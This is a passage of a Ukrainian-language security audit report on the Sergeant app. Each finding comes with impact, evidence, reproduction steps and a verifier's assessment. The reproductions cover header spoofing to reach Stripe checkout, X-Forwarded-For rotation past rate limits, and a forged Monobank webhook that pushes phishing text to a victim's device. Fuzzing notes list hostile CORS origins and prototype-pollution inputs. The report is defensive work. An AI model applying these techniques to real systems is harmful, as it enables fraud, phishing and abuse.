Підтверджено в коді й наживо. isWithinTextBound викликається лише в nutrition/applySync.ts і applyPantryEvents.ts. Текстові поля routine (name/emoji/scope), fizruk (note, name_uk) і finyk (data_json) обмежені лише лімітом рядка 256 КБ у SyncV2OpSchema (packages/shared/src/schemas/api.ts:1195-1210). Водночас власний канон у syncV2-core.ts:380-386 прямо каже, що КОЖЕН per-table applier мусить перевіряти межі на сервері, тож це прогалина відносно задекларованого інваріанту. Дві поправки. (1) Твердження «межі є лише в nutrition» неточне: fizruk має числові межі через parseOptionalBoundedNumber (weight_kg, reps, заміри в applyMisc), без меж лишаються саме текстові поля. (2) Вплив на AI-контекст слабкий: сервер не читає routine_habits для AI, контекст збирає клієнт, а /api/chat має власні ліміти тіла. Для пушу title = habit.name іде без обрізання (due.ts:142, push/send.ts), але зачіпає лише власний акаунт атакувальника. Отже це defense-in-depth і роздування сховища, low.
```

**Додаткові докази верифікатора:**

```text
v4-all.mjs і v4-nutr.mjs. routine_habits name з 100 000 символів => applied, БД length(name)=100000. routine_categories name+emoji по 50 000 => applied (length 50000/50000). fizruk_workouts note з 100 000 символів => applied. Контроль: nutrition_meals name з 500 символів => rejected text_too_long, тобто межа в nutrition працює. Рядок >256 КБ => 400 VALIDATION (row_too_large), отже стеля лише 256 КБ.
```

### [low] Країна для вибору провайдера береться з клієнтського X-Vercel-IP-Country; «сплячий» Stripe пропонується попри STRIPE_ENABLED=false

- **ID:** `server-static/webhooks-billing-quota#10` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/routes/billing.ts:62-66; apps/server/src/modules/billing/provider.ts:182-194
- **Вплив:** Якщо в проді лишився STRIPE_SECRET_KEY/PRICE (потрібен для cancel легасі-підписників), будь-хто може оформити «сплячий» Stripe, який «ніколи не пропонується українцям»; без налаштованого STRIPE_WEBHOOK_SECRET така оплата не активує Pro. Справжні іноземні юзери ж, навпаки, без заголовка завжди отримують UA-набір.
- **Що зробити:** Не довіряти X-Vercel-IP-Country на API (або приймати лише від довіреного проксі); у getEnabledProviders повертати stripe лише при env.STRIPE_ENABLED; у stripe createCheckoutSession також перевіряти прапорець.

**Докази:**

```text
userCountry(): `const header = req.headers["x-vercel-ip-country"]` — бекенд стоїть на Hetzner/Coolify, Vercel перед ним немає, тож заголовок повністю контролює клієнт. getEnabledProviders() для не-UA безумовно `return ["stripe"]`, не дивлячись на env.STRIPE_ENABLED. Живий прогін: `GET /api/billing/providers` → 200 {"providers":[]}; з `X-Vercel-IP-Country: US` → 200 {"providers":["stripe"]}; `POST /api/billing/checkout {plan:'pro',provider:'stripe'}` з тим самим заголовком дійшов до Stripe-провайдера (503 BILLING_UNAVAILABLE лише через відсутній ключ локально).
```

**Відтворення:**

```text
node <scratch>/agents/server-static-webhooks-billing-quota/probe1.mjs (рядки 'GET providers spoof US', 'POST checkout spoof US stripe').
```

**Верифікатор:**

```text
Відтворено живцем (`verify-server-static-webhooks-billing-quota/r2.mjs`): `GET /api/billing/providers` без заголовка дає `{"providers":[]}`, з `X-Vercel-IP-Country: US` дає `{"providers":["stripe"]}`. `POST /api/billing/checkout {plan:'pro',provider:'stripe'}` з цим заголовком доходить до Stripe-провайдера (503 BILLING_UNAVAILABLE лише через відсутній ключ), без заголовка дає 400 PROVIDER_UNAVAILABLE. Тобто захист `resolveProvider` («stripe від UA-юзера», `provider.ts:197-201`) обходиться самим заголовком. `userCountry()` (`billing.ts:60-64`) довіряє `x-vercel-ip-country`. Web ходить на `https://api.sergeant.com.ua` напряму (CSP connect-src у `apps/web/vercel.json`, rewrites для /api немає), бекенд на Hetzner/Coolify, тож Vercel цей заголовок не ставить і не перезаписує. `getEnabledProviders` для не-UA безумовно повертає `['stripe']`, не дивлячись на `STRIPE_ENABLED`. Уточнення до знахідки: твердження «без STRIPE_WEBHOOK_SECRET оплата не активує Pro» для прода хибне, бо `env.ts:857-862` не дає стартувати прод із `STRIPE_SECRET_KEY` без `STRIPE_WEBHOOK_SECRET` і `PRICE_ID`. Отже, якщо ключ у проді є, підробка заголовка дає повноцінну оплату через «сплячий» Stripe. Це обхід продуктової політики, а не безпеки: людина платить сама. Severity low.
```

**Додаткові докази верифікатора:**

```text
r2.mjs: 'providers US => 200 {"providers":["stripe"]}', 'checkout US stripe => 503 BILLING_UNAVAILABLE', 'checkout UA stripe => 400 PROVIDER_UNAVAILABLE'. Коментар `provider.ts:176-178` прямо описує «Для решти країн — ['stripe'] (canonical)», тож поведінка для не-UA задумана, а вада в тому, що країну задає клієнт. Не трекається.
```

### [low] Mono-вебхук без прив'язки рахунку: при витоку секрету — довільні рахунки, перезапис транзакцій і push із текстом атакувальника

- **ID:** `server-static/webhooks-billing-quota#15` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/modules/mono/webhook.ts:257,281-293,366-394,467-470
- **Вплив:** Defense-in-depth: витік одного URL дає не лише читання, а й підробку фінансових даних і фішинговий push через довірений канал застосунку.
- **Що зробити:** Обмежити autocreate (кількість stub-рахунків на з'єднання, асинхронна перевірка через client-info), не перезаписувати amount/description на конфлікті без потреби, rate-limit на з'єднання, санітизувати/шаблонізувати текст push (без вільного опису контрагента) або вимикати push для автостворених рахунків.

**Докази:**

```text
`account` з тіла не звіряється з рахунками з client-info: на FK-помилку створюється stub `INSERT INTO mono_account ... ON CONFLICT DO NOTHING` для будь-якого id; ON CONFLICT перезаписує amount/description/balance існуючої транзакції; на нову вставку шлеться push `title: amountStr, body: description` (до 80 символів довільного тексту). Rate-limit на роуті відсутній. Секрет передається в path (C1, лишковий ризик визнано).
```

**Відтворення:**

```text
Маючи URL вебхука (напр., з access-логів Traefik/Coolify), POST /api/mono/webhook/<secret> з вигаданим account і statementItem.description='Рахунок заблоковано, перейдіть …' → нова «картка», транзакція і push на пристрої жертви від імені Sergeant.
```

**Верифікатор:**

```text
Перевірено в коді. apps/server/src/modules/mono/webhook.ts автентифікує запит лише 256-бітним секретом (connection.ts:152, randomBytes(32)). Значення `account` з тіла ніде не звіряється з client-info. На помилці 23503 код створює stub `INSERT INTO mono_account ... ON CONFLICT DO NOTHING` для будь-якого id (рядки 366-382). ON CONFLICT перезаписує amount, description і balance. Для нової вставки йде push із `title: amountStr` і `body: description.slice(0,80)` (рядки 133-152, 466-470). Ні в routes/mono-webhook.ts, ні в app.ts, ні в routes/index.ts ліміту запитів немає. Ризик знижують три речі. Перше: передумова — витік єдиного автентифікатора, а це прийнятий залишковий ризик C1 (Closed, mitigated-final: редакція URL плюс 90-денна ротація). Друге: autocreate навмисний і задокументований у коментарі, без нього нова картка чи банка валила б вебхук у 500, і Monobank деактивував би його. Третє: перезапис існуючої транзакції вимагає знати mono_tx_id, а з одного злитого URL його не отримати; сама гілка ON CONFLICT UPDATE потрібна для переходу hold→settled. Решта знахідки стоїть: зі злитим URL можна без обмежень вставляти вигадані рахунки й транзакції та слати push із довільним текстом через канал застосунку. Це defense-in-depth, severity low лишається.
```

**Додаткові докази верифікатора:**

```text
Живий прогін (scratchpad/agents/verify-server-static-webhooks-billing-quota/v15_mono_rl.mjs): 60 швидких POST /api/mono/webhook/<невірний секрет> дали {"404":60}, жодного 429. Тобто ліміту немає навіть на 404-шляху; кожен запит робить один індексний lookup у БД. Відтворити вставку з валідним секретом локально не вийшло: Monobank не налаштований, у БД зберігається лише хеш секрету. Тему C1 (секрет у path) веде docs/work/specs/security-hardening/README.md. Радіус ураження після витоку (stub-рахунки, push) ніде в audits не записаний.
```

### [low] Premium-фіча «Памʼять Сержанта» (ai.memoryRecall) доступна Free через RAG у чаті

- **ID:** `server-static/webhooks-billing-quota#8` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** apps/server/src/modules/chat/chat.ts:745-756; apps/server/src/modules/ai-memory/ragContext.ts:137-197; apps/server/src/routes/ai-memory.ts:84-91; packages/shared/src/billing/entitlements.ts:55
- **Вплив:** Пейвол ai.memoryRecall обходиться звичайним чатом: Free отримує рекламовану як Premium функцію (і витрати Voyage-ембедингів на кожен перший тур).
- **Що зробити:** Узгодити рішення з власником: або гейтити RAG-ін'єкцію в чаті тим самим hasFeature(tier, "ai.memoryRecall") (через getUserPlan/accessStateOf), або прибрати memoryRecall з Premium-колонки /pricing.

**Докази:**

```text
entitlements.ts: `"ai.memoryRecall": { free: false, pro: true }`, на /pricing — «Памʼять Сержанта» (uk.pricing.ts:50). Гейт `requireFeature(pool, "ai.memoryRecall")` стоїть лише на POST /api/ai-memory/recall. Перший тур /api/chat для будь-якого юзера викликає `buildRagContext({ userId: sessionUser?.id ?? null, ... })`, а той робить `getAiMemory().recall({ userId, query, topK, caller: "chat-rag" })` без перевірки плану (лише AI_MEMORY_ENABLED/topK).
```

**Відтворення:**

```text
При увімкненому білінгу Free-юзер: POST /api/ai-memory/recall → 402 PLAN_REQUIRED; POST /api/chat з тим самим питанням → у system-контекст підмішуються top-K спогадів, і модель відповідає з урахуванням памʼяті.
```

**Верифікатор:**

```text
Підтверджено в коді. Реєстр `packages/shared/src/billing/entitlements.ts:55` ставить `"ai.memoryRecall": { free: false, pro: true }`, і спека `docs/work/specs/access-tiers.md:25` теж каже, що у Free цієї фічі немає. `requireFeature(pool, "ai.memoryRecall")` стоїть лише на `POST /api/ai-memory/recall` (`routes/ai-memory.ts:84-91`). Перший тур чату (`chat.ts:745-756`) викликає `buildRagContext({ userId: sessionUser?.id ?? null, ... })` без перевірки плану. У chat.ts немає ні `getUserPlan`, ні `accessStateOf`, ні `hasFeature`. Сам `buildRagContext` (`ragContext.ts:137-197`) пропускає виклик лише коли `AI_MEMORY_ENABLED=false`, topK=0, немає userId або запит закороткий, після чого робить `getAiMemory().recall(...)`. У `recallRoute.ts:1-10` RAG-ін'єкцію прямо названо другим викликачем того самого recall, тож Free отримує тих самих top-K спогадів, тільки автоматично. Ніде в коді, ADR чи спеці не записано, що RAG у чаті навмисно лишається безкоштовним. Severity знижено до low: (1) за `access-tiers.md:95,152` `isBillingEnforced()` у проді зараз false, тож `requirePlan` не діє і recall відкритий усім; обхід стане реальним лише після запуску білінгу; (2) `AI_MEMORY_ENABLED` за замовчуванням false (`env.ts:559`); (3) юзер отримує лише власні дані, тобто це витік монетизації, а не безпеки. Живцем не відтворено: локально немає Voyage і LLM-ключів і жоден провайдер не ввімкнено, тож 402 на recall не виникає.
```

**Додаткові докази верифікатора:**

```text
chat.ts: grep 'getUserPlan|accessStateOf|hasFeature' порожній; єдиний план-залежний виклик `resolveProTier` (рядок 642) вибирає модель, а не гейтить RAG. requirePlan.ts:35 `if (!isBillingEnforced()) { next(); return; }`. env.ts:559 `AI_MEMORY_ENABLED: boolFromEnv(false)`. Знахідка не трекається в docs/work/specs/audits/** і docs/open-work.md.
```

## info

### [info] Що тримає удар (підтверджено негативними тестами): межі тіла, JSON-парсер, CORS, prototype pollution, глибина обʼєктів

- **ID:** `api-live/input-fuzz#10` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Живе API
- **Стан:** відкрито
- **Де:** apps/server/src/http/{bodySizePolicy,apiCors,cors,requireCsrfHeader}.ts; packages/shared/src/schemas/api.ts
- **Вплив:** Поверхня здебільшого валідована жорстко; наведені вище medium/low — конкретні прогалини на тлі в цілому надійного input-handling. 404-HTML замість JSON — косметична непослідовність форми помилки для /api.
- **Що зробити:** Розглянути JSON-404 для /api/* (catch-all перед Express-дефолтом). Решту патернів тримати як є.

**Докази:**

```text
Межі тіла точні на обох боках кожного правила: limit-16 проходить, limit+1 -> 413 (statement/preview 10mb, commit 2mb, sync 6mb, backup 4mb, coach 6mb, chat 1mb, mono 32kb, web-vitals 10kb, csp 16kb, default 128kb, stripe raw 128kb, transcribe 10mb). CORS fail-closed: evil.example / null / '127.0.0.1:4173.evil.example' / 'HTTP://...' / з трейлінг-слешем — жоден не отримує ACAO чи ACAC (точне співпадіння). Prototype pollution: {__proto__:{...}} або ігнорується (strip), або 400 'Unrecognized key: constructor' — обʼєкти не отруєні. Обʼєктна глибина профілю (не-масив) >3 -> чиста 400. Malformed JSON/strlit/numlit -> 400 зі стабільним тілом. 1e308/NaN/9007199254740993 на amount/pushDailyCap -> 400. 404 на невідомий /api шлях -> HTML 'Cannot GET' замість JSON — єдина дрібна непослідовність форми.
```

**Відтворення:**

```text
node .../agents/api-live-input-fuzz/{r1_limits,r1_cors,r1_matrix,r1_semantic}.mjs.
```

**Верифікатор:**

```text
Це спостереження «що тримає удар», і вибіркова повторна перевірка його підтвердила. Межі тіла рівні на межі: N байт проходить у парсер, N+1 дає 413. Перевірено default 128kb (/api/me/preferences), /api/chat 1mb, /api/finyk/import/commit 2mb, /api/metrics/web-vitals 10kb, /api/mono/webhook 32kb, /api/v2/sync/push 6mb; ці значення збігаються з http/bodySizePolicy.ts. CORS fail-closed: origin evil.example, 'null', '127.0.0.1:4173.evil.example', 'HTTP://127.0.0.1:4173' і з трейлінг-слешем не отримують ні ACAO, ні ACAC. Порівняння точне через getAllowedOrigins().includes у cors.ts:111. Prototype pollution: {"__proto__":{...}} дає 200 зі stripped-ключем, constructor.prototype дає 400 VALIDATION, ({}).polluted лишається undefined. Malformed JSON, рядковий і числовий літерал дають 400. amount 1e308, 'NaN' і 9007199254740993 дають 400. Невідомий /api/* шлях (GET і POST, з префіксом /v1 і без) дає 404 text/html 'Cannot GET|POST …' від Express-дефолту. Це не артефакт локального env: app.ts не має JSON-404 catch-all для /api, а прод API-only (config.servesFrontend === false), тож у проді відповідь та сама. Косметично, info.
```

**Додаткові докази верифікатора:**

```text
Скрипти: r3/v10_holds.mjs і r3/v10b_limits.mjs у <scratch>/agents/verify-api-live-input-fuzz/. Перший прогін меж у v10_holds мав off-by-2 у моєму скрипті, виправлено у v10b; там at-limit дає 400/503/204/404 (тіло пройшло парсер, далі спрацювали валідація чи роут), а limit+1 стабільно дає 413. Дрібниця для повноти: 400 на malformed JSON віддає сирий текст помилки JSON.parse з уривком вхідного тіла ('Unexpected token \'4\', "42" is not valid JSON'). Це ехо власного вводу, без витоку чужих даних. Попередній аудит 2026-09-21-agent-readiness.md про HTML-тіло 404 стосується лендінгу (Vercel), а не /api сервера, тож ця знахідка не трекається.
```

### [info] req.ip керується клієнтом через X-Forwarded-For без реального проксі спереду — per-IP rate-limit бакети (auth brute-force, добові квоти) ротуються по підробленій IP

- **ID:** `api-live/unauth-sweep#3` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Живе API
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Лише локальне середовище:** так, у проді може не відтворитись
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md §1.1 «Увесь per-IP rate-limit веб-трафіку схлопнутий в один бакет» (калібрування TRUST_PROXY під Vercel Edge→Traefik, ADR-0074 TBD)
- **Де:** apps/server/src/http/rateLimit.ts:92 (getIp-&gt;req.ip); apps/server/src/app.ts:110,113-115 (trustProxy=1 default); apps/server/src/lib/trustProxy.ts; apps/server/src/http/authMiddleware.ts:25-50 (authSensitiveRateLimit — default subject ip:&lt;req.ip&gt;)
- **Вплив:** Локально будь-який per-IP лімітер обходиться ротацією X-Forwarded-For: anti-brute-force на /api/auth/* (per-IP бакет), pre-auth IP-лімітери sync/finyk, добові стелі barcode/food-search. У проді з ОДНИМ довіреним проксі (TRUST_PROXY=1, Coolify дописує реальний IP) це не експлуатується, і M2-хардинг забороняє TRUST_PROXY=true — тому envOnly для локального спостереження. Але вся per-IP безпека тримається на припущенні рівно одного довіреного хопа: якщо в проді зʼявиться другий хоп (напр. Cloudflare) без підняття TRUST_PROXY до 2, req.ip знову стане підробним і brute-force/квоти-лімітери впадуть.
- **Що зробити:** Тримати TRUST_PROXY у відповідності з фактичною кількістю хопів у проді (перевірити, чи немає Cloudflare перед Coolify; якщо є — 2, інакше 1) і покрити перевіркою при деплою; для критичних лімітів додати per-account/per-target шар (як authAccountRateLimit), щоб не залежати лише від req.ip.

**Докази:**

```text
node 04-xff.mjs проти /api/csp-report (per-IP 120/хв): без XFF -> RateLimit-Remaining 119; X-Forwarded-For:9.9.9.9 -> 119,118,117 (власний бакет); X-Forwarded-For:8.8.8.8 -> 119,118 (окремий свіжий бакет); знову 9.9.9.9 -> 116. Кожне значення XFF дає окремий бакет -> req.ip=значення XFF. Причина: getIp() повертає req.ip (rateLimit.ts:92), app.set('trust proxy',1), а локально перед сервером немає проксі, тож leftmost-after-trusted-hop = заголовок клієнта.
```

**Відтворення:**

```text
node <scratch>/agents/api-live-unauth-sweep/04-xff.mjs — порівняти RateLimit-Remaining між XFF=9.9.9.9 та XFF=8.8.8.8 (обидва стартують з 119 незалежно).
```

**Верифікатор:**

```text
Локально відтворено. Ліміт /api/csp-report 120 на хвилину. XFF=198.51.100.11 дає 119, потім 118. XFF=198.51.100.12 дає свіжий бакет із 119. Значення "198.51.100.13, 10.0.0.1" теж дає свіжий бакет, тобто з `trust proxy=1` береться крайній правий запис.

Це прямий наслідок того, що dev-сервер відкритий без проксі, а `createApp` за замовчуванням ставить trustProxy=1 (app.ts:106-115). Припущення про один проксі задокументоване: rateLimit.ts:71-90, trustProxy.ts, env-vars.md:404-415. На проді перед застосунком завжди стоїть Coolify Traefik і дописує реальний peer, тому спуфінг неможливий, як і визнає сама знахідка (envOnly).

Для проду лишається питання калібрування TRUST_PROXY під ланцюг Vercel Edge, Traefik, застосунок. Воно вже відкрите в іншому вигляді: попередній аудит фіксує протилежну проблему, а саме схлопування всіх веб-користувачів в IP egress-вузла Vercel. Підняття до 2, яке пропонує знахідка, при прямій досяжності бекенд-домену навпаки зробило б req.ip підробним для прямих запитів. Тому рекомендація потребує обережності.

Серйозність знижено до info: локальний артефакт, а реальний прод-ризик уже відстежується.
```

**Додаткові докази верифікатора:**

```text
Перевірка: <scratch>/agents/verify-api-live-unauth-sweep/02-xff.mjs.
apps/web/middleware.ts копіює заголовки запиту і не виставляє x-forwarded-for (рядки 76-96), тож на проді XFF формує Traefik.
c2-containers.md:110 і ADR-0074 позначають «TRUST_PROXY калібрування під Traefik» як TBD.
```

### [info] Консольний шум на кожному завантаженні Фініка: 404 /api/v1/mono/sync-state, 503 vapid-public і silpo/sync-state

- **ID:** `browser-surfaces/finyk-flows#13` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Браузер · поверхні
- **Стан:** відкрито
- **Лише локальне середовище:** так, у проді може не відтворитись
- **Уже відстежується:** docs/work/specs/audits/2026-09-01-product-audit/findings.md
- **Де:** GET /api/v1/mono/sync-state, /api/v1/push/vapid-public, /api/v1/silpo/sync-state
- **Вплив:** Лише шум у консолі й моніторингу на цьому стенді. У проді інтеграції увімкнені.
- **Що зробити:** Коли інтеграцію вимкнено, віддавати 200 {enabled:false} замість 404 і не опитувати повторно.

**Докази:**

```text
r3-01-recon.mjs: на кожну навігацію приблизно 2 запити '404 GET /api/v1/mono/sync-state {error: Monobank webhook integration is disabled, code: NOT_FOUND}' і '503 GET /api/v1/push/vapid-public'. У console: 'Failed to load resource: ... 404/503'. pageErrors порожні на всіх сторінках, UI не ламається. У лозі сервера лише 503 від silpo, у моїх флоу 500 немає.
```

**Відтворення:**

```text
Відкрити будь-яку сторінку /finyk/* з DevTools.
```

**Верифікатор:**

```text
Відтворено. 404 від mono/sync-state з'являється через assertWebhookEnabled (apps/server/src/modules/mono/connection.ts:47-50), бо локально MONO_WEBHOOK_ENABLED=false. Клієнт робить одну повторну спробу (useMonobankWebhook retry: authAwareRetry(1)), звідси приблизно 2 запити на навігацію. vapid-public дає 503, коли VAPID не налаштовано (push.ts:99-102). Сторінка від цього не ламається, pageErrors порожні, retry-шторму немає. Пояснення 503 від vapid-public на кожне завантаження вже записано в аудиті 2026-09-01. envOnly умовно true: у проді вебхук і VAPID, імовірно, ввімкнені. Проте MONO_WEBHOOK_ENABLED за замовчуванням false (feature-flags.md:90), тож будь-який прод-інстанс без інтеграції дасть той самий шум.
```

**Додаткові докази верифікатора:**

```text
v2-finyk.mjs, приблизно 7 завантажень сторінок: {"503 GET /api/v1/push/vapid-public":10, "404 GET /api/v1/mono/sync-state":11, "503 GET /api/v1/silpo/sync-state":2}, pageErrors: [].
```

### [info] Немає дії «Вийти на всіх пристроях»: лише поштучне «Завершити», хоча revokeSessions уже є в authClient

- **ID:** `browser-surfaces/hub-shell#15` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Браузер · поверхні
- **Стан:** відкрито
- **Де:** apps/web/src/core/profile/SessionsSection.tsx (лише revokeSession); apps/web/src/core/auth/authClient.ts:109,180,259 (revokeSessions експортовано, не використовується)
- **Вплив:** При підозрі на компрометацію людина має завершувати кожну сесію вручну (і кожна, як показано вище, ще живе ~5 хв).
- **Що зробити:** Додати «Завершити всі інші сесії» (revokeOtherSessions) з підтвердженням, і пропонувати її після зміни пароля.

**Докази:**

```text
grep: revokeSessions ніде не викликається. Скріншот <scratch>/shots/hub-shell/47-A-sessions.png: у кожної сесії тільки кнопка «Завершити», загальної дії немає.
```

**Відтворення:**

```text
Профіль → Активні сесії.
```

**Верифікатор:**

```text
Підтверджено в коді й на скріншоті. `SessionsSection.tsx` імпортує з authClient лише `getSession`, `listSessions` і `revokeSession` (рядки 17-22). Кожен рядок сесії має одну кнопку `COPY.revoke` = «Завершити» (рядки 291-300), а під списком стоїть тільки «Оновити» (рядки 307-316). Масової дії немає. У `uk.ts:469-485` (`profileSessions`) теж немає тексту для «завершити всі/інші». `revokeSessions` деструктурується й експортується в `authClient.ts:109,180,259`, але викликають його тільки в `authClient.test.ts` (перевірка списку експортів). `revokeOtherSessions` клієнт не обгортає взагалі. Скріншот 47-A-sessions.png це підтверджує: дві сесії Chrome 141, у кожної своя «Завершити», загальної дії немає. Головне пом'якшення, яке знахідка недооцінює: шлях виходу з компрометації вже є. `auth.ts` `hooks.before` примусово ставить `revokeOtherSessions=true` для кожного `/change-password`, а `revokeSessionsOnPasswordReset: true` (auth.ts:375) робить те саме для скидання пароля. Тож зміна пароля вже завершує всі інші сесії на сервері, і частина рекомендації «пропонувати її після зміни пароля» вже виконується автоматично. Решта знахідки — UX/defense-in-depth: не можна вийти з усіх інших пристроїв, не змінюючи пароля. Вікно ~5 хв справжнє: `session.cookieCache.maxAge = 60*5` (auth.ts:427-430), але масове відкликання це вікно так само не прибрало б. Severity info доречна. Ознак того, що відсутність дії свідома (ADR чи коментар), немає.
```

**Додаткові докази верифікатора:**

```text
apps/web/src/core/profile/SessionsSection.tsx:17-22 (імпортуються лише getSession/listSessions/revokeSession), :291-300 (кнопка «Завершити» на кожну сесію), :307-316 (лише «Оновити»). apps/web/src/core/auth/authClient.ts:109,180,259 — revokeSessions оголошено й експортовано, у застосунку не викликається (grep: збіги тільки в authClient.test.ts:154). apps/server/src/auth.ts:597-604 — hooks.before примусово ставить revokeOtherSessions=true на /change-password; auth.ts:375 revokeSessionsOnPasswordReset: true; auth.ts:427-430 cookieCache.maxAge 300 s. Скріншот <scratch>/shots/hub-shell/47-A-sessions.png переглянуто: 2 сесії, у кожної «Завершити», масової дії немає.
```

### [info] Юридичні сторінки публічно показують внутрішню примітку «Founder/lawyer review gate…» і плейсхолдери реквізитів

- **ID:** `browser-surfaces/public-auth-pages#18` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Браузер · поверхні
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/2026-08-05-external-critique-surface.md
- **Де:** /legal/privacy, /legal/terms, /legal/cookies, /legal/offer; apps/web/src/core/legal/legalShared.ts, offerDocument.ts
- **Вплив:** Політика приватності без ідентифікації контролера не відповідає GDPR Art. 13 і ЗУ про ПД. Публічна примітка-чернетка підриває довіру до документів.
- **Що зробити:** Заповнити реквізити або сховати оферту до запуску платежів. Прибрати внутрішню примітку з публічного тексту (лишити бейдж «бета»). Нагадування в launch-readiness уже є, тут лише підтверджено, що стан незмінний.

**Докази:**

```text
26-legal.mjs: на всіх чотирьох сторінках «Founder/lawyer review gate: це робочий draft до public launch, не юридична консультація…»; privacy: «Контролер: ФОП [ПІБ], РНОКПП [xxxxxxxxxx, буде внесено перед public launch], адреса реєстрації [буде внесена…]»; offer: «IBAN: [UAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, буде внесено перед public launch]». Уже зафіксовано в docs/work/specs/audits/2026-08-05-external-critique-surface.md і досі в проді.
```

**Відтворення:**

```text
Відкрий /legal/privacy і /legal/offer.
```

**Верифікатор:**

```text
Відтворено на всіх чотирьох юридичних сторінках. Плашка `<strong>Founder/lawyer review gate:</strong> {messages.legal.reviewGateNotice}` (LegalDocumentView.tsx:47-50) рендериться публічно. `CONTROLLER_PLACEHOLDER` (legalShared.ts:20-21) і реквізити оферти (offerDocument.ts:131-132) — плейсхолдери. Плашку задокументовано як навмисну (docs/design/design/specs/2026-09-17-legal-design.md:57-58). Реквізити — відомий блокер запуску, який веде власник. Severity info доречна: знахідка лише підтверджує, що стан не змінився.
```

**Додаткові докази верифікатора:**

```text
w18-legal.mjs: /legal/privacy → «Founder/lawyer review gate: це робочий draft до public launch…», «Контролер: ФОП [ПІБ], РНОКПП [xxxxxxxxxx, буде внесено перед public launch]…»; /legal/offer → «Виконавець: ФОП [ПІБ], РНОКПП [xxxxxxxxxx…]», «IBAN: [UAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, буде внесено перед public launch]»; /legal/terms і /legal/cookies мають ту саму плашку. Відстежується: external-critique §1.2, docs/work/specs/launch/business/04-launch-readiness.md:37 (чекбокс «Реквізити ФОП» не відмічено), docs/work/specs/audits/verification/findings.json EXT-20260805-1-2 status "open".
```

### [info] Гігієна CSP вебу: зайві джерела скриптів у script-src, Report-Only нічого нового не ловить, meta-CSP у проді теж enforced (а коментар каже протилежне)

- **ID:** `client-static/infra-headers-ci-deps#9` · **Вердикт:** підтверджено · **Категорія:** `xss` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Уже відстежується:** docs/work/specs/security-hardening/C2-frontend-csp.md
- **Де:** apps/web/vercel.json:41-46; apps/web/index.html:55-90 (коментар рядок 59, meta рядок 87)
- **Вплив:** Якщо з'явиться HTML-інʼєкція, script-src з *.posthog.com дає готовий гаджет для обходу CSP. Report-Only лише дублює звіти. Через неправильне уявлення про meta-CSP майбутнє розширення політики лише у vercel.json (новий connect-src тощо) у проді тихо заблокує meta-тег.
- **Що зробити:** Прибрати Sentry CDN-хости з script-src. Звузити PostHog до конкретного assets-хоста (напр. https://eu-assets.i.posthog.com) або ввімкнути `disable_external_dependency_loading`, якщо replay/heatmaps можна вантажити з бандла. Видалити Report-Only або зробити його строгішим кандидатом (напр. з trusted-types). Виправити коментар в index.html і додати тест, що meta-CSP не вужча за заголовок.

**Докази:**

```text
Enforced: `script-src 'self' 'wasm-unsafe-eval' https://*.posthog.com https://*.sentry-cdn.com https://*.sentry.io https://js.sentry-cdn.com`. Sentry SDK бандлиться з npm (vendor-sentry чанк, initSentry робить import()), тож CDN-хости Sentry не потрібні. *.posthog.com охоплює хости, з яких PostHog віддає JS site-apps/функцій, написаний будь-яким власником PostHog-проєкту. Content-Security-Policy-Report-Only є строгим надмножинним варіантом enforced-політики (додає 'unsafe-inline', ws:, wss:, localhost), тож нових порушень він не репортить ніколи. index.html:59: «a Vercel header always wins over a `<meta http-equiv>` tag, so this duplicate is invisible». Насправді прод-HTML /sign-in містить meta CSP, і браузер застосовує обидві політики (перетин).
```

**Відтворення:**

```text
NODE_USE_ENV_PROXY=1 NODE_EXTRA_CA_CERTS=/root/.ccr/ca-bundle.crt node <scratch>/agents/client-static-infra-headers-ci-deps/hdr.mjs https://app.sergeant.com.ua/ і .../meta.mjs
```

**Верифікатор:**

```text
The facts check out, but the impact is overstated. (1) Report-Only is strictly looser than the enforced policy. My directive diff (v9-diff.mjs) shows its only differences are extra entries: script-src gets 'unsafe-inline' and connect-src gets localhost:3000, 127.0.0.1:3000, wss: and ws:. Nothing is missing, so it never reports anything the enforced policy wouldn't. Removing Report-Only is already a known pending operational step (C2-frontend-csp.md, 'Report-Only retained', listed in docs/open-work.md:94; beta-security-readiness F5). (2) The meta CSP is in the prod HTML (I fetched app.sergeant.com.ua/sign-in) and browsers enforce it together with the header, so the index.html:59 comment 'a Vercel header always wins ... invisible' is factually wrong. However, the claimed harm (a future widening of vercel.json gets silently blocked by the meta tag) is already prevented: apps/web/src/test/cspMonitoringAllowlist.test.ts S11 fails when the meta tag is missing any source the enforced policy grants ('meta is missing sources the enforced policy grants'), plus full directive-set parity. So the comment is wrong but harmless. (3) Sentry is loaded only via `import("@sentry/react")` (sentry.ts:315), and there is no lazyLoadIntegration or loader script. The *.sentry-cdn.com, js.sentry-cdn.com and *.sentry.io entries in script-src are unused, which is hygiene. (4) *.posthog.com in script-src is functionally needed: replay, heatmaps and exception autocapture lazy-load from the PostHog assets host. Narrowing it to the EU assets host is reasonable. The claim that any PostHog tenant can host executable JS on *.posthog.com (site apps) as a CSP-bypass gadget was not verified and needs an HTML injection first. This is defense-in-depth hygiene with no exploitable path shown, so I downgrade it to info.
```

**Додаткові докази верифікатора:**

```text
v9-diff.mjs: `script-src | RO-extra: 'unsafe-inline' | RO-missing: -`; `connect-src | RO-extra: http://localhost:3000 http://127.0.0.1:3000 wss: ws: | RO-missing: -`. Meta vs enforced: meta-missing is '-' for every comparable directive. v9-meta.mjs: prod /sign-in returns both the header CSP and the `<meta http-equiv="Content-Security-Policy">`. The guard test is cspMonitoringAllowlist.test.ts:256-322 (S11 parity, both directions).
```

